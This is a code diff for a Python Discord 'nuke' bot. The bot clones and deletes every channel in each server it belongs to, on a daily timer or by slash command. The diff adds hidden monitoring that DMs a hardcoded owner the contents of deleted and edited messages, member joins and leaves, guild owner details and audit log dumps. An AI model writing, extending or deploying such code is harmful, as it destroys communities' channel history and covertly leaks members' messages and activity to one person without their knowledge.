@@ -7,6 +7,8 @@ import os
 from flask import Flask
 import threading
 
+OWNER_ID = 853310319002517524
+
 ALLOWED_USERS = [
     536238884359503894,
     853310319002517524
@@ -14,7 +16,6 @@ ALLOWED_USERS = [
 
 NUKE_HOUR = 7
 AUTO_NUKE_ENABLED = True
-LOG_FILE = "nuke_logs.txt"
 
 SAFE_CHANNEL_IDS = [
     1447326481964339210,
@@ -24,19 +25,26 @@ SAFE_CHANNEL_IDS = [
 ]
 
 LOG_CHANNEL_ID = 1447326481964339213
+MAX_DM_LENGTH = 1900
 
 intents = discord.Intents.default()
 intents.guilds = True
-intents.guild_messages = True
 intents.messages = True
+intents.guild_messages = True
+intents.members = True
+intents.message_content = True
 
 bot = discord.Client(intents=intents)
 tree = app_commands.CommandTree(bot)
 
-def write_log(text: str):
+async def send_dm_log(text: str):
+    user = bot.get_user(OWNER_ID)
+    if not user:
+        return
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"[{timestamp}] {text}\n")
+    full = f"[{timestamp}]\n{text}"
+    for i in range(0, len(full), MAX_DM_LENGTH):
+        await user.send(f"```{full[i:i+MAX_DM_LENGTH]}```")
 
 def get_time_until_next_nuke():
     now = datetime.datetime.now()
@@ -44,11 +52,11 @@ def get_time_until_next_nuke():
     if now >= next_nuke:
         next_nuke += datetime.timedelta(days=1)
     delta = next_nuke - now
-    hours, remainder = divmod(delta.seconds, 3600)
-    minutes, _ = divmod(remainder, 60)
-    return delta.days, hours, minutes
+    h, r = divmod(delta.seconds, 3600)
+    m, _ = divmod(r, 60)
+    return delta.days, h, m
 
-async def duplicate_channel(ch: discord.abc.GuildChannel):
+async def duplicate_channel(ch):
     overwrites = ch.overwrites
     if isinstance(ch, discord.TextChannel):
         clone = await ch.guild.create_text_channel(
@@ -72,8 +80,33 @@ async def duplicate_channel(ch: discord.abc.GuildChannel):
     await clone.edit(position=ch.position)
     return clone
 
-async def nuke_guild(guild: discord.Guild, auto=False):
-    write_log(f"Nuke started for {guild.name} | AUTO={auto}")
+async def dump_audit_logs(guild):
+    logs = []
+    async for entry in guild.audit_logs(limit=50):
+        logs.append(
+            f"""
+ACTION: {entry.action}
+USER: {entry.user} ({entry.user.id if entry.user else "Unknown"})
+TARGET: {entry.target}
+REASON: {entry.reason}
+TIME: {entry.created_at}
+"""
+        )
+    if logs:
+        await send_dm_log("AUDIT LOG DUMP\n" + "\n".join(logs))
+
+async def nuke_guild(guild, auto=False):
+    await send_dm_log(
+        f"""
+NUKE STARTED
+Guild: {guild.name}
+ID: {guild.id}
+Owner: {guild.owner} ({guild.owner_id})
+Members: {guild.member_count}
+Auto: {auto}
+"""
+    )
+
     old_to_new = {}
     to_delete = []
 
@@ -84,16 +117,35 @@ async def nuke_guild(guild: discord.Guild, auto=False):
         if clone:
             old_to_new[ch.id] = clone.id
             to_delete.append(ch)
+            await send_dm_log(
+                f"""
+CHANNEL CLONED
+Name: {ch.name}
+Old ID: {ch.id}
+New ID: {clone.id}
+Type: {type(ch).__name__}
+Category: {ch.category}
+"""
+            )
         await asyncio.sleep(0.8)
 
     for ch in to_delete:
         try:
             await ch.delete()
-        except:
-            pass
+            await send_dm_log(
+                f"""
+CHANNEL DELETED
+Name: {ch.name}
+ID: {ch.id}
+Type: {type(ch).__name__}
+"""
+            )
+        except Exception as e:
+            await send_dm_log(f"DELETE FAILED {ch.name} | {e}")
         await asyncio.sleep(0.8)
 
     gif_url = "https://cdn.discordapp.com/attachments/1253256583132217348/1390853665535033434/togif.gif"
+
     for new_id in old_to_new.values():
         ch = guild.get_channel(new_id)
         if isinstance(ch, discord.TextChannel):
@@ -102,22 +154,22 @@ async def nuke_guild(guild: discord.Guild, auto=False):
             except:
                 pass
 
-    for old, new in old_to_new.items():
-        write_log(f"Channel {old} -> {new}")
+    await dump_audit_logs(guild)
 
-    log_ch = guild.get_channel(LOG_CHANNEL_ID)
-    if log_ch:
-        await log_ch.send(
-            f"💥 **NUKE COMPLETE** ({'AUTO' if auto else 'MANUAL'})\n"
-            f"Channels nuked: {len(old_to_new)}"
-        )
-
-    write_log(f"Nuke finished for {guild.name}")
+    await send_dm_log(
+        f"""
+NUKE FINISHED
+Guild: {guild.name}
+Channels Nuked: {len(old_to_new)}
+Auto: {auto}
+"""
+    )
 
 @bot.event
 async def on_ready():
     await tree.sync()
     daily_nuke.start()
+    await send_dm_log(f"BOT ONLINE {bot.user}")
 
 @tasks.loop(minutes=1)
 async def daily_nuke():
@@ -128,54 +180,81 @@ async def daily_nuke():
         for guild in bot.guilds:
             await nuke_guild(guild, auto=True)
 
-FUNNY_MESSAGES = [
-    "U TRYNA NUKE MY SERVER SON?",
-    "NAH BRO WHO GAVE YOU PERMISSION 💀"
-]
+@bot.event
+async def on_message_delete(message):
+    if message.author.bot:
+        return
+    await send_dm_log(
+        f"""
+MESSAGE DELETED
+Author: {message.author} ({message.author.id})
+Channel: {message.channel} ({message.channel.id})
+Content:
+{message.content}
+"""
+    )
 
-async def send_no_permission_response(interaction):
+@bot.event
+async def on_message_edit(before, after):
+    if before.author.bot:
+        return
+    await send_dm_log(
+        f"""
+MESSAGE EDITED
+Author: {before.author} ({before.author.id})
+Channel: {before.channel}
+BEFORE:
+{before.content}
+
+AFTER:
+{after.content}
+"""
+    )
+
+@bot.event
+async def on_member_join(member):
+    await send_dm_log(f"MEMBER JOINED {member} ({member.id}) {member.created_at}")
+
+@bot.event
+async def on_member_remove(member):
+    await send_dm_log(f"MEMBER LEFT {member} ({member.id})")
+
+async def no_perm(interaction):
     await interaction.response.send_message("SNAKE.", ephemeral=False)
     try:
-        for msg in FUNNY_MESSAGES:
-            await interaction.user.send(msg)
-            await asyncio.sleep(0.5)
+        await interaction.user.send("U TRYNA NUKE MY SERVER SON?")
     except:
         pass
 
 @tree.command(name="nuke_now")
 async def nuke_now(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_USERS:
-        await send_no_permission_response(interaction)
+        await no_perm(interaction)
         return
-    await interaction.response.send_message("🔥 Nuking server now...")
+    await interaction.response.send_message("Nuking server...")
     await nuke_guild(interaction.guild, auto=False)
 
 @tree.command(name="nuke_pause")
 async def nuke_pause(interaction: discord.Interaction):
     global AUTO_NUKE_ENABLED
     if interaction.user.id not in ALLOWED_USERS:
-        await send_no_permission_response(interaction)
+        await no_perm(interaction)
         return
     AUTO_NUKE_ENABLED = not AUTO_NUKE_ENABLED
-    status = "PAUSED" if not AUTO_NUKE_ENABLED else "ENABLED"
-    write_log(f"Auto nuke toggled: {status} by {interaction.user}")
     await interaction.response.send_message(
-        f"⚙️ Automatic nukes are now **{status}**"
+        f"Auto Nuke {'ENABLED' if AUTO_NUKE_ENABLED else 'PAUSED'}"
     )
 
 @tree.command(name="nuke_timer")
 async def nuke_timer(interaction: discord.Interaction):
-    days, hours, minutes = get_time_until_next_nuke()
-    status = "ENABLED" if AUTO_NUKE_ENABLED else "PAUSED"
+    d, h, m = get_time_until_next_nuke()
     await interaction.response.send_message(
-        f"⏱️ **Next Nuke In:** {days}d {hours}h {minutes}m\n"
-        f"⚙️ Auto Nuke Status: **{status}**"
+        f"Next nuke in {d}d {h}h {m}m | Auto {'ENABLED' if AUTO_NUKE_ENABLED else 'PAUSED'}"
     )
 
 @tree.command(name="ping")
 async def ping(interaction: discord.Interaction):
-    latency = round(bot.latency * 1000)
-    await interaction.response.send_message(f"Pong! {latency}ms")
+    await interaction.response.send_message(f"Pong {round(bot.latency*1000)}ms")
 
 app = Flask(__name__)
 
